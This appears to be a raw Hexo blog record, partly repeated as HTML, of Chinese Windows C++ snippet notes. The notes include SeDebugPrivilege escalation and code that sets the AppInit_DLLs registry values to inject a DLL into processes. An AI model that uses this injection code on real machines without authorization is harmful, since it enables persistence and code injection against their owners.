pfnRtlAdjustPrivilege)(\n    UINT32 Privilege,\n    BOOLEAN Enable,\n    BOOLEAN Client,\n    PBOOLEAN WasEnabled);\n\nBOOL GrantPriviledge(IN UINT32 Priviledge)\n{\n    pfnRtlAdjustPrivilege    RtlAdjustPrivilege = NULL;\n    BOOLEAN                    WasEnable = FALSE;\n\n    RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L\"ntdll.dll\"), \"RtlAdjustPrivilege\");\n    if (RtlAdjustPrivilege == NULL)\n    {\n        return FALSE;\n    }\n\n    RtlAdjustPrivilege(Priviledge, TRUE, FALSE, &WasEnable);\n\n    return TRUE;\n}\n\nRtlAdjustPrivilege\n```\n\n### 进程线程镜像\n\n```c++\n// 使用ToolHelp系列函数\n\n#include <TlHelp32.h>\n\nBOOL GetProcessIdByProcessImageName(IN PWCHAR wzProcessImageName, OUT PUINT32 ProcessId)\n{\n    HANDLE            ProcessSnapshotHandle = INVALID_HANDLE_VALUE;\n    PROCESSENTRY32    ProcessEntry32 = { 0 };\n\n    ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);        // 初始化PROCESSENTRY32结构\n\n    ProcessSnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    // 给系统所有的进程快照\n    if (ProcessSnapshotHandle == INVALID_HANDLE_VALUE)\n    {\n        return FALSE;\n    }\n\n    if (Process32First(ProcessSnapshotHandle, &ProcessEntry32))        // 找到第一个\n    {\n        do\n        {\n            if (lstrcmpi(ProcessEntry32.szExeFile, wzProcessImageName) == 0)        // 不区分大小写\n            {\n                *ProcessId = ProcessEntry32.th32ProcessID;\n                break;\n            }\n        } while (Process32Next(ProcessSnapshotHandle, &ProcessEntry32));\n    }\n\n    CloseHandle(ProcessSnapshotHandle);\n    ProcessSnapshotHandle = INVALID_HANDLE_VALUE;\n\n    if (*ProcessId == 0)\n    {\n        return FALSE;\n    }\n    return TRUE;\n}\n\n\n```\n\n###  注册表\n\n```c++\nint main()\n{\n    LSTATUS Status = 0;\n#ifdef _WIN64\n\t　　　　WCHAR*\twzSubKey = L\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\";\n#else\n\t　　　　WCHAR*\twzSubKey = L\"SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\";\n#endif // _WIN64\n\n    HKEY    hKey = NULL;\n\n    // 打开注册表\n    Status = RegOpenKeyExW(HKEY_LOCAL_MACHINE,        // 要打开的主键\n        wzSubKey,            // 要打开的子键名字地址\n        0,                    // 保留，传0\n        KEY_ALL_ACCESS,        // 打开的方式\n        &hKey);                // 返回的子键句柄\n    if (Status != ERROR_SUCCESS)\n    {\n        return 0;\n    }\n\n    WCHAR*    wzValueName = L\"AppInit_DLLs\";\n    DWORD    dwValueType = 0;\n    UINT8    ValueData[MAX_PATH] = { 0 };\n    DWORD    dwReturnLength = 0;\n\n    // 查询注册表\n    Status = RegQueryValueExW(hKey,        // 子键句柄\n        wzValueName,        // 待查询键值的名称\n        NULL,                // 保留\n        &dwValueType,        // 数据类型\n        ValueData,            // 键值\n        &dwReturnLength);\n\n\n    WCHAR    wzDllFullPath[MAX_PATH] = { 0 };\n    GetCurrentDirectoryW(MAX_PATH, wzDllFullPath);\n\n#ifdef _WIN64\n    wcscat_s(wzDllFullPath, L\"\\\\x64NormalDll.dll\");\n#else\n    wcscat_s(wzDllFullPath, L\"\\\\x86NormalDll.dll\");\n#endif\n\n    // 设置键值\n    Status = RegSetValueExW(hKey,\n        wzValueName,\n        NULL,\n        dwValueType,\n        (CONST BYTE*)wzDllFullPath,\n        (lstrlen(wzDllFullPath) + 1) * sizeof(WCHAR));\n    if (Status != ERROR_SUCCESS)\n    {\n        return 0;\n    }\n\n    wzValueName = L\"LoadAppInit_DLLs\";\n    DWORD    dwLoadAppInit = 1;\n\n    // 查询注册表\n    Status = RegQueryValueExW(hKey, wzValueName, NULL, &dwValueType, ValueData, &dwReturnLength);\n\n    // 设置键值\n    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)&dwLoadAppInit, sizeof(DWORD));\n    if (Status != ERROR_SUCCESS)\n    {\n        return 0;\n    }\n\n    printf(\"Input Any Key To Resume\\r\\n\");\n\n    getchar();\n    getchar();\n\n    // 恢复键值\n    dwLoadAppInit = 0;\n    Status = RegQueryValueExW(hKey, wzValueName, NULL, &dwValueType, ValueData, &dwReturnLength);\n    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)&dwLoadAppInit, sizeof(DWORD));\n\n    wzValueName = L\"AppInit_DLLs\";\n    ZeroMemory(wzDllFullPath, (lstrlen(wzDllFullPath) + 1) * sizeof(WCHAR));\n    Status = RegQueryValueExW(hKey, wzValueName, NULL, &dwValueType, ValueData, &dwReturnLength);\n    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)wzDllFullPath, 0);\n\n\n    return 0;\n}\n```\n\n","source":"_posts/常用代码.md","raw":"---\ntitle: 常用代码\ntags: [开发]\nindex_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/wallhaven-wyk166.jpg\nbanner_img: https://gitee.com//L0yy/BlogImg/raw/master/typora/wallhaven-wyk166.jpg\n---\n\n[toc]\n\n### Visual Studio相关\n\n#### 定义字符串常量的差别\n\nvs2019\n\n```c++\nconst WCHAR* Mes1 = L\"Hello world!\";   //较为严格\nWCHAR Mes2[] = L\"Hello world!\";\nWCHAR Mes3[] = { L'A',L'B',L'R',L'l',0};//注意是单引号\nchar Mes4[] = {'a','b','v'};\n```\n\nvs2013\n\n```c\nWCHAR* Mes1 = L\"Hello world!\";\nWCHAR Mes2[] = L\"Hello world!\";\nWCHAR Mes3[] = { L'A',L'B',L'R',L'l',0};\nchar Mes4[] = {'a','b','v'};\n```\n\n### 错误提示\n\n```c++\n#include <windows.h>\n#include <strsafe.h>\n\nvoid ErrorExit(const char* lpszFunction)\n{\n\tLPVOID lpMsgBuf;\n\tchar Mes[1024] = { 0, };\n\tLPVOID lpDisplayBuf;\n\tDWORD dw = GetLastError();\n\n\tFormatMessageA(\n\t\tFORMAT_MESSAGE_ALLOCATE_BUFFER |\n\t\tFORMAT_MESSAGE_FROM_SYSTEM |\n\t\tFORMAT_MESSAGE_IGNORE_INSERTS,\n\t\tNULL,\n\t\tdw,\n\t\tMAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),\n\t\t(LPSTR)& lpMsgBuf,\n\t\t0, NULL);\n\n\tsprintf_s(Mes, \"%s failed with error 0x%x: %s\", lpszFunction, dw, lpMsgBuf);\n\tMessageBoxA(NULL, Mes, \"failed\", MB_OK);\n\tExitProcess(dw);\n}\n\nvoid main()\n{\n\tif (!GetProcessId(NULL))\n\t\tErrorExit(\"GetProcessId\");\n}\n```\n\n\n\n### 宏定义相关\n\n#### 定义函数\n\n```\ntypedef NTSTATUS (WINAPI* FN_NtQueryInformationThread)(\n\tIN HANDLE               ThreadHandle,\n\tIN THREAD_INFORMATION_CLASS ThreadInformationClass,\n\tOUT PVOID               ThreadInformation,\n\tIN ULONG                ThreadInformationLength,\n\tOUT PULONG              ReturnLength OPTIONAL);\n\t\ntypedef struct _THREAD_BASIC_INFORMATION\n{\n\tNTSTATUS                ExitStatus;\n\tPVOID                   TebBaseAddress;\n\tint\t\t\t\t\t\tClientId;\n\tKAFFINITY               AffinityMask;\n\tint\t\t\t\t\t\tPriority;\n\tint\t\t\t\t\t\tBasePriority;\n\tint\t\t\t\t\t\tv;\n} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;\n\t\nvoid Func()\n{\n\tFN_NtQueryInformationThread NtQueryInformationThread =(FN_NtQueryInformationThread)GetProcAddress(LoadLibrary(L\"Ntdll.dll\"), \"NtQueryInformationThread\");\n\tNtQueryInformationThread(hOpenThread, (THREAD_INFORMATION_CLASS)0, &threadBasicInfo, sizeof(threadBasicInfo), NULL);\n}\n```\n\n\n\n### 提权操作\n\n#### 令牌方式\n\n```c++\n// 传入参数 SeDebugPrivilege，提升到调试权限\n\nBOOL GrantPriviledge(WCHAR* PriviledgeName)\n{\n    TOKEN_PRIVILEGES TokenPrivileges, OldPrivileges;\n    DWORD             dwReturnLength = sizeof(OldPrivileges);\n    HANDLE             TokenHandle = NULL;\n    LUID             uID;\n\n    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &TokenHandle))\n    {\n        if (GetLastError() != ERROR_NO_TOKEN)\n        {\n            return FALSE;\n        }\n        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle))\n        {\n            return FALSE;\n        }\n    }\n\n    if (!LookupPrivilegeValue(NULL, PriviledgeName, &uID))        // 通过权限名称查找uID\n    {\n        CloseHandle(TokenHandle);\n        return FALSE;\n    }\n\n    TokenPrivileges.PrivilegeCount = 1;        // 要提升的权限个数\n    TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n    TokenPrivileges.Privileges[0].Luid = uID;\n\n    if (!AdjustTokenPrivileges(TokenHandle, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), &OldPrivileges, &dwReturnLength))\n    {\n        CloseHandle(TokenHandle);\n        return FALSE;\n    }\n\n    CloseHandle(TokenHandle);\n    cout<< \"[+] AdjustTokenPrivileges to SeDebugPrivilege Success!\" << endl;\n    return TRUE;\n}\n\n```\n#### RtlAdjustPrivilege\n\n```c++\n// 传入参数 SE_DEBUG_PRIVILEGE，提升到调试权限\n\n#define SE_DEBUG_PRIVILEGE                (20L)\n\ntypedef\nNTSTATUS(NTAPI * pfnRtlAdjustPrivilege)(\n    UINT32 Privilege,\n    BOOLEAN Enable,\n    BOOLEAN Client,\n    PBOOLEAN WasEnabled);\n\nBOOL GrantPriviledge(IN UINT32 Priviledge)\n{\n    pfnRtlAdjustPrivilege    RtlAdjustPrivilege = NULL;\n    BOOLEAN                    WasEnable = FALSE;\n\n    RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L\"ntdll.dll\"), \"RtlAdjustPrivilege\");\n    if (RtlAdjustPrivilege == NULL)\n    {\n        return FALSE;\n    }\n\n    RtlAdjustPrivilege(Priviledge, TRUE, FALSE, &WasEnable);\n\n    return TRUE;\n}\n\nRtlAdjustPrivilege\n```\n\n### 进程线程镜像\n\n```c++\n// 使用ToolHelp系列函数\n\n#include <TlHelp32.h>\n\nBOOL GetProcessIdByProcessImageName(IN PWCHAR wzProcessImageName, OUT PUINT32 ProcessId)\n{\n    HANDLE            ProcessSnapshotHandle = INVALID_HANDLE_VALUE;\n    PROCESSENTRY32    ProcessEntry32 = { 0 };\n\n    ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);        // 初始化PROCESSENTRY32结构\n\n    ProcessSnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    // 给系统所有的进程快照\n    if (ProcessSnapshotHandle == INVALID_HANDLE_VALUE)\n    {\n        return FALSE;\n    }\n\n    if (Process32First(ProcessSnapshotHandle, &ProcessEntry32))        // 找到第一个\n    {\n        do\n        {\n            if (lstrcmpi(ProcessEntry32.szExeFile, wzProcessImageName) == 0)        // 不区分大小写\n            {\n                *ProcessId = ProcessEntry32.th32ProcessID;\n                break;\n            }\n        } while (Process32Next(ProcessSnapshotHandle, &ProcessEntry32));\n    }\n\n    CloseHandle(ProcessSnapshotHandle);\n    ProcessSnapshotHandle = INVALID_HANDLE_VALUE;\n\n    if (*ProcessId == 0)\n    {\n        return FALSE;\n    }\n    return TRUE;\n}\n\n\n```\n\n###  注册表\n\n```c++\nint main()\n{\n    LSTATUS Status = 0;\n#ifdef _WIN64\n\t　　　　WCHAR*\twzSubKey = L\"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\";\n#else\n\t　　　　WCHAR*\twzSubKey = L\"SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\";\n#endif // _WIN64\n\n    HKEY    hKey = NULL;\n\n    // 打开注册表\n    Status = RegOpenKeyExW(HKEY_LOCAL_MACHINE,        // 要打开的主键\n        wzSubKey,            // 要打开的子键名字地址\n        0,                    // 保留，传0\n        KEY_ALL_ACCESS,        // 打开的方式\n        &hKey);                // 返回的子键句柄\n    if (Status != ERROR_SUCCESS)\n    {\n        return 0;\n    }\n\n    WCHAR*    wzValueName = L\"AppInit_DLLs\";\n    DWORD    dwValueType = 0;\n    UINT8    ValueData[MAX_PATH] = { 0 };\n    DWORD    dwReturnLength = 0;\n\n    // 查询注册表\n    Status = RegQueryValueExW(hKey,        // 子键句柄\n        wzValueName,        // 待查询键值的名称\n        NULL,                // 保留\n        &dwValueType,        // 数据类型\n        ValueData,            // 键值\n        &dwReturnLength);\n\n\n    WCHAR    wzDllFullPath[MAX_PATH] = { 0 };\n    GetCurrentDirectoryW(MAX_PATH, wzDllFullPath);\n\n#ifdef _WIN64\n    wcscat_s(wzDllFullPath, L\"\\\\x64NormalDll.dll\");\n#else\n    wcscat_s(wzDllFullPath, L\"\\\\x86NormalDll.dll\");\n#endif\n\n    // 设置键值\n    Status = RegSetValueExW(hKey,\n        wzValueName,\n        NULL,\n        dwValueType,\n        (CONST BYTE*)wzDllFullPath,\n        (lstrlen(wzDllFullPath) + 1) * sizeof(WCHAR));\n    if (Status != ERROR_SUCCESS)\n    {\n        return 0;\n    }\n\n    wzValueName = L\"LoadAppInit_DLLs\";\n    DWORD    dwLoadAppInit = 1;\n\n    // 查询注册表\n    Status = RegQueryValueExW(hKey, wzValueName, NULL, &dwValueType, ValueData, &dwReturnLength);\n\n    // 设置键值\n    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)&dwLoadAppInit, sizeof(DWORD));\n    if (Status != ERROR_SUCCESS)\n    {\n        return 0;\n    }\n\n    printf(\"Input Any Key To Resume\\r\\n\");\n\n    getchar();\n    getchar();\n\n    // 恢复键值\n    dwLoadAppInit = 0;\n    Status = RegQueryValueExW(hKey, wzValueName, NULL, &dwValueType, ValueData, &dwReturnLength);\n    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)&dwLoadAppInit, sizeof(DWORD));\n\n    wzValueName = L\"AppInit_DLLs\";\n    ZeroMemory(wzDllFullPath, (lstrlen(wzDllFullPath) + 1) * sizeof(WCHAR));\n    Status = RegQueryValueExW(hKey, wzValueName, NULL, &dwValueType, ValueData, &dwReturnLength);\n    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)wzDllFullPath, 0);\n\n\n    return 0;\n}\n```\n\n","slug":"常用代码","published":1,"date":"2020-03-18T01:26:39.546Z","updated":"2020-03-18T01:53:24.002Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw634001qccuquu4npfnd","content":"<p>[toc]</p>\n<h3 id=\"Visual-Studio相关\"><a href=\"#Visual-Studio相关\" class=\"headerlink\" title=\"Visual Studio相关\"></a>Visual Studio相关</h3><h4 id=\"定义字符串常量的差别\"><a href=\"#定义字符串常量的差别\" class=\"headerlink\" title=\"定义字符串常量的差别\"></a>定义字符串常量的差别</h4><p>vs2019</p>\n<pre><code class=\"c++\">const WCHAR* Mes1 = L&quot;Hello world!&quot;;   //较为严格\nWCHAR Mes2[] = L&quot;Hello world!&quot;;\nWCHAR Mes3[] = { L&#39;A&#39;,L&#39;B&#39;,L&#39;R&#39;,L&#39;l&#39;,0};//注意是单引号\nchar Mes4[] = {&#39;a&#39;,&#39;b&#39;,&#39;v&#39;};</code></pre>\n<p>vs2013</p>\n<pre><code class=\"c\">WCHAR* Mes1 = L&quot;Hello world!&quot;;\nWCHAR Mes2[] = L&quot;Hello world!&quot;;\nWCHAR Mes3[] = { L&#39;A&#39;,L&#39;B&#39;,L&#39;R&#39;,L&#39;l&#39;,0};\nchar Mes4[] = {&#39;a&#39;,&#39;b&#39;,&#39;v&#39;};</code></pre>\n<h3 id=\"错误提示\"><a href=\"#错误提示\" class=\"headerlink\" title=\"错误提示\"></a>错误提示</h3><pre><code class=\"c++\">#include &lt;windows.h&gt;\n#include &lt;strsafe.h&gt;\n\nvoid ErrorExit(const char* lpszFunction)\n{\n    LPVOID lpMsgBuf;\n    char Mes[1024] = { 0, };\n    LPVOID lpDisplayBuf;\n    DWORD dw = GetLastError();\n\n    FormatMessageA(\n        FORMAT_MESSAGE_ALLOCATE_BUFFER |\n        FORMAT_MESSAGE_FROM_SYSTEM |\n        FORMAT_MESSAGE_IGNORE_INSERTS,\n        NULL,\n        dw,\n        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),\n        (LPSTR)&amp; lpMsgBuf,\n        0, NULL);\n\n    sprintf_s(Mes, &quot;%s failed with error 0x%x: %s&quot;, lpszFunction, dw, lpMsgBuf);\n    MessageBoxA(NULL, Mes, &quot;failed&quot;, MB_OK);\n    ExitProcess(dw);\n}\n\nvoid main()\n{\n    if (!GetProcessId(NULL))\n        ErrorExit(&quot;GetProcessId&quot;);\n}</code></pre>\n<h3 id=\"宏定义相关\"><a href=\"#宏定义相关\" class=\"headerlink\" title=\"宏定义相关\"></a>宏定义相关</h3><h4 id=\"定义函数\"><a href=\"#定义函数\" class=\"headerlink\" title=\"定义函数\"></a>定义函数</h4><pre><code>typedef NTSTATUS (WINAPI* FN_NtQueryInformationThread)(\n    IN HANDLE               ThreadHandle,\n    IN THREAD_INFORMATION_CLASS ThreadInformationClass,\n    OUT PVOID               ThreadInformation,\n    IN ULONG                ThreadInformationLength,\n    OUT PULONG              ReturnLength OPTIONAL);\n\ntypedef struct _THREAD_BASIC_INFORMATION\n{\n    NTSTATUS                ExitStatus;\n    PVOID                   TebBaseAddress;\n    int                        ClientId;\n    KAFFINITY               AffinityMask;\n    int                        Priority;\n    int                        BasePriority;\n    int                        v;\n} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;\n\nvoid Func()\n{\n    FN_NtQueryInformationThread NtQueryInformationThread =(FN_NtQueryInformationThread)GetProcAddress(LoadLibrary(L&quot;Ntdll.dll&quot;), &quot;NtQueryInformationThread&quot;);\n    NtQueryInformationThread(hOpenThread, (THREAD_INFORMATION_CLASS)0, &amp;threadBasicInfo, sizeof(threadBasicInfo), NULL);\n}</code></pre><h3 id=\"提权操作\"><a href=\"#提权操作\" class=\"headerlink\" title=\"提权操作\"></a>提权操作</h3><h4 id=\"令牌方式\"><a href=\"#令牌方式\" class=\"headerlink\" title=\"令牌方式\"></a>令牌方式</h4><pre><code class=\"c++\">// 传入参数 SeDebugPrivilege，提升到调试权限\n\nBOOL GrantPriviledge(WCHAR* PriviledgeName)\n{\n    TOKEN_PRIVILEGES TokenPrivileges, OldPrivileges;\n    DWORD             dwReturnLength = sizeof(OldPrivileges);\n    HANDLE             TokenHandle = NULL;\n    LUID             uID;\n\n    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &amp;TokenHandle))\n    {\n        if (GetLastError() != ERROR_NO_TOKEN)\n        {\n            return FALSE;\n        }\n        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;TokenHandle))\n        {\n            return FALSE;\n        }\n    }\n\n    if (!LookupPrivilegeValue(NULL, PriviledgeName, &amp;uID))        // 通过权限名称查找uID\n    {\n        CloseHandle(TokenHandle);\n        return FALSE;\n    }\n\n    TokenPrivileges.PrivilegeCount = 1;        // 要提升的权限个数\n    TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n    TokenPrivileges.Privileges[0].Luid = uID;\n\n    if (!AdjustTokenPrivileges(TokenHandle, FALSE, &amp;TokenPrivileges, sizeof(TOKEN_PRIVILEGES), &amp;OldPrivileges, &amp;dwReturnLength))\n    {\n        CloseHandle(TokenHandle);\n        return FALSE;\n    }\n\n    CloseHandle(TokenHandle);\n    cout&lt;&lt; &quot;[+] AdjustTokenPrivileges to SeDebugPrivilege Success!&quot; &lt;&lt; endl;\n    return TRUE;\n}\n</code></pre>\n<h4 id=\"RtlAdjustPrivilege\"><a href=\"#RtlAdjustPrivilege\" class=\"headerlink\" title=\"RtlAdjustPrivilege\"></a>RtlAdjustPrivilege</h4><pre><code class=\"c++\">// 传入参数 SE_DEBUG_PRIVILEGE，提升到调试权限\n\n#define SE_DEBUG_PRIVILEGE                (20L)\n\ntypedef\nNTSTATUS(NTAPI * pfnRtlAdjustPrivilege)(\n    UINT32 Privilege,\n    BOOLEAN Enable,\n    BOOLEAN Client,\n    PBOOLEAN WasEnabled);\n\nBOOL GrantPriviledge(IN UINT32 Priviledge)\n{\n    pfnRtlAdjustPrivilege    RtlAdjustPrivilege = NULL;\n    BOOLEAN                    WasEnable = FALSE;\n\n    RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;), &quot;RtlAdjustPrivilege&quot;);\n    if (RtlAdjustPrivilege == NULL)\n    {\n        return FALSE;\n    }\n\n    RtlAdjustPrivilege(Priviledge, TRUE, FALSE, &amp;WasEnable);\n\n    return TRUE;\n}\n\nRtlAdjustPrivilege</code></pre>\n<h3 id=\"进程线程镜像\"><a href=\"#进程线程镜像\" class=\"headerlink\" title=\"进程线程镜像\"></a>进程线程镜像</h3><pre><code class=\"c++\">// 使用ToolHelp系列函数\n\n#include &lt;TlHelp32.h&gt;\n\nBOOL GetProcessIdByProcessImageName(IN PWCHAR wzProcessImageName, OUT PUINT32 ProcessId)\n{\n    HANDLE            ProcessSnapshotHandle = INVALID_HANDLE_VALUE;\n    PROCESSENTRY32    ProcessEntry32 = { 0 };\n\n    ProcessEntry32.dwSize = sizeof(PROCESSENTRY32);        // 初始化PROCESSENTRY32结构\n\n    ProcessSnapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    // 给系统所有的进程快照\n    if (ProcessSnapshotHandle == INVALID_HANDLE_VALUE)\n    {\n        return FALSE;\n    }\n\n    if (Process32First(ProcessSnapshotHandle, &amp;ProcessEntry32))        // 找到第一个\n    {\n        do\n        {\n            if (lstrcmpi(ProcessEntry32.szExeFile, wzProcessImageName) == 0)        // 不区分大小写\n            {\n                *ProcessId = ProcessEntry32.th32ProcessID;\n                break;\n            }\n        } while (Process32Next(ProcessSnapshotHandle, &amp;ProcessEntry32));\n    }\n\n    CloseHandle(ProcessSnapshotHandle);\n    ProcessSnapshotHandle = INVALID_HANDLE_VALUE;\n\n    if (*ProcessId == 0)\n    {\n        return FALSE;\n    }\n    return TRUE;\n}\n\n</code></pre>\n<h3 id=\"注册表\"><a href=\"#注册表\" class=\"headerlink\" title=\"注册表\"></a>注册表</h3><pre><code class=\"c++\">int main()\n{\n    LSTATUS Status = 0;\n#ifdef _WIN64\n    　　　　WCHAR*    wzSubKey = L&quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows&quot;;\n#else\n    　　　　WCHAR*    wzSubKey = L&quot;SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows&quot;;\n#endif // _WIN64\n\n    HKEY    hKey = NULL;\n\n    // 打开注册表\n    Status = RegOpenKeyExW(HKEY_LOCAL_MACHINE,        // 要打开的主键\n        wzSubKey,            // 要打开的子键名字地址\n        0,                    // 保留，传0\n        KEY_ALL_ACCESS,        // 打开的方式\n        &amp;hKey);                // 返回的子键句柄\n    if (Status != ERROR_SUCCESS)\n    {\n        return 0;\n    }\n\n    WCHAR*    wzValueName = L&quot;AppInit_DLLs&quot;;\n    DWORD    dwValueType = 0;\n    UINT8    ValueData[MAX_PATH] = { 0 };\n    DWORD    dwReturnLength = 0;\n\n    // 查询注册表\n    Status = RegQueryValueExW(hKey,        // 子键句柄\n        wzValueName,        // 待查询键值的名称\n        NULL,                // 保留\n        &amp;dwValueType,        // 数据类型\n        ValueData,            // 键值\n        &amp;dwReturnLength);\n\n\n    WCHAR    wzDllFullPath[MAX_PATH] = { 0 };\n    GetCurrentDirectoryW(MAX_PATH, wzDllFullPath);\n\n#ifdef _WIN64\n    wcscat_s(wzDllFullPath, L&quot;\\\\x64NormalDll.dll&quot;);\n#else\n    wcscat_s(wzDllFullPath, L&quot;\\\\x86NormalDll.dll&quot;);\n#endif\n\n    // 设置键值\n    Status = RegSetValueExW(hKey,\n        wzValueName,\n        NULL,\n        dwValueType,\n        (CONST BYTE*)wzDllFullPath,\n        (lstrlen(wzDllFullPath) + 1) * sizeof(WCHAR));\n    if (Status != ERROR_SUCCESS)\n    {\n        return 0;\n    }\n\n    wzValueName = L&quot;LoadAppInit_DLLs&quot;;\n    DWORD    dwLoadAppInit = 1;\n\n    // 查询注册表\n    Status = RegQueryValueExW(hKey, wzValueName, NULL, &amp;dwValueType, ValueData, &amp;dwReturnLength);\n\n    // 设置键值\n    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)&amp;dwLoadAppInit, sizeof(DWORD));\n    if (Status != ERROR_SUCCESS)\n    {\n        return 0;\n    }\n\n    printf(&quot;Input Any Key To Resume\\r\\n&quot;);\n\n    getchar();\n    getchar();\n\n    // 恢复键值\n    dwLoadAppInit = 0;\n    Status = RegQueryValueExW(hKey, wzValueName, NULL, &amp;dwValueType, ValueData, &amp;dwReturnLength);\n    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)&amp;dwLoadAppInit, sizeof(DWORD));\n\n    wzValueName = L&quot;AppInit_DLLs&quot;;\n    ZeroMemory(wzDllFullPath, (lstrlen(wzDllFullPath) + 1) * sizeof(WCHAR));\n    Status = RegQueryValueExW(hKey, wzValueName, NULL, &amp;dwValueType, ValueData, &amp;dwReturnLength);\n    Status = RegSetValueExW(hKey, wzValueName, NULL, dwValueType, (CONST BYTE*)wzDllFullPath, 0);\n\n\n    return 0;\n}</code></pre>\n","site":{"data":{}},"excerpt":"","more":"<p>[toc]</p>\n<h3 id=\"Visual-Studio相关\"><a href=\"#Visual-Studio相关\" class=\"headerlink\" title=\"Visual Studio相关\"></a>Visual Studio相关</h3><h4 id=\"定义字符串常量的差别\"><a href=\"#定义字符串常量的差别\" class=\"headerlink\" title=\"定义字符串常量的差别\"></a>定义字符串常量的差别</h4><p>vs2019</p>\n<pre><code class=\"c++\">const WCHAR* Mes1 = L&quot;Hello world!&quot;;   //较为严格\nWCHAR Mes2[] = L&quot;Hello world!&quot;;\nWCHAR Mes3[] = { L&#39;A&#39;,L&#39;B&#39;,L&#39;R&#39;,L&#39;l&#39;,0};//注意是单引号\nchar Mes4[] = {&#39;a&#39;,&#39;b&#39;,&#39;v&#39;};</code></pre>\n<p>vs2013</p>\n<pre><code class=\"c\">WCHAR* Mes1 = L&quot;Hello world!&quot;;\nWCHAR Mes2[] = L&quot;Hello world!&quot;;\nWCHAR Mes3[] = { L&#39;A&#39;,L&#39;B&#39;,L&#39;R&#39;,L&#39;l&#39;,0};\nchar Mes4[] = {&#39;a&#39;,&#39;b&#39;,&#39;v&#39;};</code></pre>\n<h3 id=\"错误提示\"><a href=\"#错误提示\" class=\"headerlink\" title=\"错误提示\"></a>错误提示</h3><pre><code class=\"c++\">#include &lt;windows.h&gt;\n#include &lt;strsafe.h&gt;\n\nvoid ErrorExit(const char* lpszFunction)\n{\n    LPVOID lpMsgBuf;\n    char Mes[1024] = { 0, };\n    LPVOID lpDisplayBuf;\n    DWORD dw = GetLastError();\n\n    FormatMessageA(\n        FORMAT_MESSAGE_ALLOCATE_BUFFER |\n        FORMAT_MESSAGE_FROM_SYSTEM |\n        FORMAT_MESSAGE_IGNORE_INSERTS,\n        NULL,\n        dw,\n        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),\n        (LPSTR)&amp; lpMsgBuf,\n        0, NULL);\n\n    sprintf_s(Mes, &quot;%s failed with error 0x%x: %s&quot;, lpszFunction, dw, lpMsgBuf);\n    MessageBoxA(NULL, Mes, &quot;failed&quot;, MB_OK);\n    ExitProcess(dw);\n}\n\nvoid main()\n{\n    if (!GetProcessId(NULL))\n        ErrorExit(&quot;GetProcessId&quot;);\n}</code></pre>\n<h3 id=\"宏定义相关\"><a href=\"#宏定义相关\" class=\"headerlink\" title=\"宏定义相关\"></a>宏定义相关</h3><h4 id=\"定义函数\"><a href=\"#定义函数\" class=\"headerlink\" title=\"定义函数\"></a>定义函数</h4><pre><code>typedef NTSTATUS (WINAPI* FN_NtQueryInformationThread)(\n    IN HANDLE               ThreadHandle,\n    IN THREAD_INFORMATION_CLASS ThreadInformationClass,\n    OUT PVOID               ThreadInformation,\n    IN ULONG                ThreadInformationLength,\n    OUT PULONG              ReturnLength OPTIONAL);\n\ntypedef struct _THREAD_BASIC_INFORMATION\n{\n    NTSTATUS                ExitStatus;\n    PVOID                   TebBaseAddress;\n    int                        ClientId;\n    KAFFINITY               AffinityMask;\n    int                        Priority;\n    int                        BasePriority;\n    int                        v;\n} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;\n\nvoid Func()\n{\n    FN_NtQueryInformationThread NtQueryInformationThread =(FN_NtQueryInformationThread)GetProcAddress(LoadLibrary(L&quot;Ntdll.dll&quot;), &quot;NtQueryInformationThread&quot;);\n    NtQueryInformationThread(hOpenThread, (THREAD_INFORMATION_CLASS)0, &amp;threadBasicInfo, sizeof(threadBasicInfo), NULL);\n}</code></pre><h3 id=\"提权操作\"><a href=\"#提权操作\" 